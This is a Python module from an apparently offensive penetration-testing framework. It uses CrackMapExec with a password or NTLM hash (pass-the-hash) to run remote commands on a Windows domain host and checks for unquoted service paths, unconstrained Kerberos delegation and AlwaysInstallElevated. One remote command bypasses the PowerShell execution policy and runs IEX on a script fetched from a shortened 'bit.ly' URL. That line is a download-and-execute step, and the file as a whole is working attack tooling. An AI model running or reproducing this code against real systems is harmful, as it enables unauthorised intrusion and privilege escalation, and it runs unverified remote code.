#!/usr/bin/env python3
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Credential, Vulnerability, Target
from core.logger import setup_logger, get_logger

logger = None

def run_privesc_scan(session_dir, target_ip, domain, username, password=None, ntlm_hash=None):
    global logger
    setup_logger("privesc_scan", session_dir)
    logger = get_logger("privesc_scan")
    
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    logger.info(f"Starting Privilege Escalation scan on {target_ip}")
    
    # Build credential string for CrackMapExec
    if password:
        cred_args = ["-u", username, "-p", password]
    elif ntlm_hash:
        cred_args = ["-u", username, "-H", ntlm_hash]
    else:
        logger.error("No credentials provided")
        return
    
    # 1. Check for unquoted service paths using PowerUp
    logger.info("Checking for unquoted service paths...")
    powerup_cmd = [
        "crackmapexec", "smb", target_ip,
        "-d", domain
    ] + cred_args + [
        "-X", "powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://bit.ly/PowerUp'); Invoke-AllChecks | Select-String 'Unquoted'\""
    ]
    
    try:
        result = subprocess.run(powerup_cmd, capture_output=True, text=True, timeout=60)
        if "ServiceName" in result.stdout or "unquoted" in result.stdout.lower():
            logger.warning(f"Unquoted service paths found on {target_ip}")
            # Store vulnerability
            session = db.get_session()
            target_obj = session.query(Target).filter_by(ip_address=target_ip).first()
            if target_obj:
                vuln = Vulnerability(
                    target_id=target_obj.id,
                    name="Unquoted Service Path",
                    severity="Medium",
                    description="Service paths with spaces not enclosed in quotes can be exploited for privilege escalation"
                )
                session.add(vuln)
                session.commit()
            session.close()
    except Exception as e:
        logger.debug(f"PowerUp check failed: {e}")
    
    # 2. Check for Kerberos delegation
    logger.info("Checking for Kerberos delegation abuse...")
    delegation_cmd = [
        "crackmapexec", "ldap", target_ip,
        "-d", domain
    ] + cred_args + [
        "--trusted-for-delegation"
    ]
    
    try:
        result = subprocess.run(delegation_cmd, capture_output=True, text=True, timeout=30)
        if "TrustedForDelegation" in result.stdout:
            logger.warning(f"Delegation abuse opportunities found on {target_ip}")
            session = db.get_session()
            target_obj = session.query(Target).filter_by(ip_address=target_ip).first()
            if target_obj:
                vuln = Vulnerability(
                    target_id=target_obj.id,
                    name="Kerberos Unconstrained Delegation",
                    severity="High",
                    description="Computer/user accounts configured for unconstrained delegation"
                )
                session.add(vuln)
                session.commit()
            session.close()
    except Exception as e:
        logger.debug(f"Delegation check failed: {e}")
    
    # 3. Check for AlwaysInstallElevated
    logger.info("Checking for AlwaysInstallElevated registry key...")
    reg_cmd = [
        "crackmapexec", "smb", target_ip,
        "-d", domain
    ] + cred_args + [
        "-x", "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
    ]
    
    try:
        result = subprocess.run(reg_cmd, capture_output=True, text=True, timeout=30)
        if "0x1" in result.stdout:
            logger.warning(f"AlwaysInstallElevated enabled on {target_ip}")
            session = db.get_session()
            target_obj = session.query(Target).filter_by(ip_address=target_ip).first()
            if target_obj:
                vuln = Vulnerability(
                    target_id=target_obj.id,
                    name="AlwaysInstallElevated",
                    severity="High",
                    description="MSI packages can be installed with SYSTEM privileges"
                )
                session.add(vuln)
                session.commit()
            session.close()
    except Exception as e:
        logger.debug(f"Registry check failed: {e}")
    
    logger.info("Privilege escalation scan complete")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password")
    parser.add_argument("--ntlm-hash")
    args = parser.parse_args()
    
    run_privesc_scan(args.session_dir, args.target_ip, args.domain, 
                    args.username, args.password, args.ntlm_hash)
